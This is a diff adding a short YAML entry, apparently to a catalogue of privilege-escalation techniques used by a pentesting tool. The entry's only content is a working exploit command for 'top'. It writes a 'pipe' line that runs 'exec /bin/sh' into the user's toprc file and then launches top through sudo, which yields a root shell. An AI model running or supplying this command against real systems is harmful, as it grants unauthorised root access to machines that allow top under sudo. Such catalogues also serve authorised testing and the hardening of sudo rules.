@@ -1,0 +1,5 @@
+name: top
+binary_path: /usr/bin/top
+exploit_cmds:
+- 'echo -e ''pipe\tx\texec /bin/sh 1>&0 2>&0'' >>~/.config/procps/toprc && sudo /usr/bin/top
+  && # press return twice && reset'
